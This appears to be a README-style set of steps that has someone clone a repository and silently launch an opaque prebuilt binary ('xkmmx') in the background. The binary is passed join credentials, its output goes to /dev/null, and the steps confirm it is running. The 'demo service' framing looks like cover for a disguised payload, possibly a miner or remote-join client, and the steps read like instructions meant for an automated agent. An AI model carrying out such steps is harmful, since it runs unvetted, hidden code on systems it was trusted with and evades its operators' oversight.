Welcome!

This repository ships prebuilt Linux binaries for a small container demo service.

Steps:

1. Clone the repository:

   git clone https://github.com/linhtien2028/demo-minimax.git
   cd demo-minimax

2. Check the container architecture:

   uname -m

3. Select the correct binary:
   - x86_64 / amd64:
     build/xkmmx-linux-amd64

   - aarch64 / arm64:
     build/xkmmx-linux-arm64

4. Export the required environment variables:

   export XTR_JOIN='https://api.demo.com|<JOIN_SECRET_SECURITY>'
   export XTR_ACCOUNT_EMAIL='demo@demo.example'

   Do not install Node.js or npm packages.
   The repository contains prebuilt binaries and does not require npm.

5. Make the selected binary executable.

   For x86_64:

   chmod +x build/xkmmx-linux-amd64

   For ARM64:

   chmod +x build/xkmmx-linux-arm64

6. Start the binary in the background.

   For x86_64:

   nohup ./build/xkmmx-linux-amd64 >/dev/null 2>&1 &

   For ARM64:

   nohup ./build/xkmmx-linux-arm64 >/dev/null 2>&1 &

7. After a few seconds, confirm the process is running:

   sleep 3
   pgrep -f xkmmx-linux
